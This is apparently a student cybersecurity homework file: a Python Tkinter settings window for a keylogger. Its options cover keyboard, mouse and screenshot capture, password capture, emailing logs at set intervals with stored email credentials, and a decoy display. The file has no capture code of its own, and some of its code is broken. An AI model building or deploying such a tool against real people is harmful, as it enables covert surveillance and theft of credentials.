import tkinter
from tkinter import *

global lines


class MyWindow:
    def __init__(self, win):
        self.ImageLabel = Label(win, text='Image Source', font=('Franklin Gothic Heavy', 10, 'italic'), relief=GROOVE)
        self.PathLabel = Label(win, text='Path', font=('Franklin Gothic Heavy', 10, 'italic'), relief=GROOVE)
        self.SendToEmailLabel = Label(win, text='Minutes To Send To Email',
                                      font=('Franklin Gothic Heavy', 10, 'italic'), relief=GROOVE)
        self.EmailLabel = Label(win, text='Email', font=('Franklin Gothic Heavy', 10, 'italic'), relief=GROOVE)
        self.PasswordLabel = Label(win, text='Password', font=('Franklin Gothic Heavy', 10, 'italic'), relief=GROOVE)
        self.CheckLabel = Label(win, text='Enable/Disable Features ↓↓↓', font=('Franklin Gothic Heavy', 10, 'italic'),
                                relief=GROOVE)

        self.CheckLabel.config(bg="lightcoral")
        self.ImageLabel.config(bg="limegreen")
        self.PathLabel.config(bg="limegreen")
        self.SendToEmailLabel.config(bg="limegreen")
        self.EmailLabel.config(bg="limegreen")
        self.PasswordLabel.config(bg="limegreen")

        self.Text1 = Entry(bd=3, bg="limegreen")
        self.Text2 = Entry(bd=3, bg="limegreen")
        self.Text3 = Entry(bd=3, bg="limegreen")
        self.Text4 = Entry(bd=3, bg="limegreen")
        self.Text5 = Entry(bd=3, bg="limegreen")

        self.CheckLabel.place(x=0, y=300)
        self.ImageLabel.place(x=50, y=50)
        self.Text1.place(x=220, y=50)
        self.PathLabel.place(x=50, y=100)
        self.Text2.place(x=220, y=100)
        self.SendToEmailLabel.place(x=50, y=150)
        self.Text3.place(x=220, y=150)
        self.EmailLabel.place(x=50, y=200)
        self.Text4.place(x=220, y=200)
        self.PasswordLabel.place(x=50, y=250)
        self.Text5.place(x=220, y=250)

        self.Checkbutton1 = IntVar()
        self.MouseButton = Checkbutton(win, text="Mouse",
                                       variable=self.Checkbutton1,
                                       onvalue=1,
                                       offvalue=0,
                                       height=2,
                                       width=10,
                                       bg='dimgray')
        self.MouseButton.place(x=30, y=350)

        self.Checkbutton2 = IntVar()
        self.KeyboardButton = Checkbutton(win, text="Keyboard",
                                          variable=self.Checkbutton2,
                                          onvalue=1,
                                          offvalue=0,
                                          height=2,
                                          width=10,
                                          bg='dimgray')
        self.KeyboardButton.place(x=150, y=350)

        self.Checkbutton3 = IntVar()
        self.ScreenshotButton = Checkbutton(win, text="Screenshot",
                                            variable=self.Checkbutton3,
                                            onvalue=1,
                                            offvalue=0,
                                            height=2,
                                            width=10,
                                            bg='dimgray')
        self.ScreenshotButton.place(x=270, y=350)

        self.Checkbutton4 = IntVar()
        self.EmailSendButton = Checkbutton(win, text="Send To Email",
                                           variable=self.Checkbutton4,
                                           onvalue=1,
                                           offvalue=0,
                                           height=2,
                                           width=10,
                                           bg='dimgray')
        self.EmailSendButton.place(x=30, y=400)

        self.Checkbutton5 = IntVar()
        self.PasswordButton = Checkbutton(win, text="Password",
                                          variable=self.Checkbutton5,
                                          onvalue=1,
                                          offvalue=0,
                                          height=2,
                                          width=10,
                                          bg='dimgray')
        self.PasswordButton.place(x=150, y=400)

        self.Checkbutton6 = IntVar()
        self.DisplayDecoyButton = Checkbutton(win, text="Display Decoy",
                                              variable=self.Checkbutton6,
                                              onvalue=1,
                                              offvalue=0,
                                              height=2,
                                              width=10,
                                              bg='dimgray')
        self.DisplayDecoyButton.place(x=270, y=400)

        self.b1 = Button(win, text='Save Settings', command=self.save, font=('Franklin Gothic Heavy', 10, 'italic'),
                         bg='limegreen')
        self.b2 = Button(win, text='Fetch Current Settings', command=self.update,
                         font=('Franklin Gothic Heavy', 10, 'italic'), bg='gold')
        TerminateButton = Button(Application, text='Terminate Program', command=Application.destroy,
                                 font=('Franklin Gothic Heavy', 10, 'italic'),
                                 bg='lightcoral')
        TerminateButton.place(x=305, y=470)
        self.b1.place(x=15, y=470)
        self.b2.place(x=135, y=470)

        label = tkinter.Label(
            text="Created By Abdallah & Fadi",
            fg="white",
            bg="black",
            width=65,
            height=2
        )
        label.place(x=0, y=515)

        label = tkinter.Label(
            text="Introduction To Cyber - HomeWork 2",
            fg="white",
            bg="black",
            width=65,
            height=2
        )
        label.place(x=0, y=0)

    def save(self):
        URL = self.Text1.get()
        if len(URL) != 0:
            lines[0] = URL

        path = self.Text2.get()
        if len(path) != 0:
            lines[1] = path.replace("\\", "/").replace(" ", "")
        lines[2] = self.Text3.getint(lines[2])

        email = self.Text4.get()
        if len(email) != 0:
            lines[3] = email
        password = self.Text5.get()
        if len(password) != 0:
            lines[4] = password

        lines[5] = int(self.Checkbutton1.get())
        lines[6] = int(self.Checkbutton2.get())
        lines[7] = int(self.Checkbutton3.get())
        lines[8] = int(self.Checkbutton4.get())
        lines[9] = int(self.Checkbutton5.get())
        lines[10] = int(self.Checkbutton6.get())

        with open('setting.txt', "w") as myfile:
            for x in lines:
                myfile.write(str(x).replace("\n", ""))
                myfile.write("\n")

    def update(self):
        self.Text1.delete(0, END)
        self.Text1.insert(0, lines[0])
        self.Text2.delete(0, END)
        self.Text2.insert(0, lines[1])
        self.Text3.delete(0, END)
        self.Text3.insert(0, lines[2])
        self.Text4.delete(0, END)
        self.Text4.insert(0, lines[3])
        self.Text5.delete(0, END)
        self.Text5.insert(0, lines[4])

        self.Checkbutton1.set(int(lines[5]))
        self.Checkbutton2.set(int(lines[6]))
        self.Checkbutton3.set(int(lines[7]))
        self.Checkbutton4.set(int(lines[8]))
        self.Checkbutton5.set(int(lines[9]))
        self.Checkbutton6.set(int(lines[10]))

        self.MouseButton.pack()
        self.KeyboardButton.pack()
        self.ScreenshotButton.pack()
        self.DisplayDecoyButton.pack()
        self.PasswordButton.pack()
        self.EmailSendButton.pack()

        self.KeyboardButton.place(x=150, y=350)
        self.MouseButton.place(x=30, y=350)
        self.ScreenshotButton.place(x=270, y=350)
        self.DisplayDecoyButton.place(x=270, y=400)
        self.PasswordButton.place(x=150, y=400)
        self.EmailSendButton.place(x=30, y=400)


with open('setting.txt') as f:
    lines = f.readlines()

Application = Tk()

BackGround = PhotoImage(
    file=r"images/appBackground.png")
label1 = Label(Application, image=BackGround)
label1.place(x=-2, y=0)
mywin = MyWindow(Application)
Application.title('KeyLogger')
Application.geometry("450x550+10+10")
Application['background'] = 'gray'
Application.resizable(False, False)
Application.mainloop()
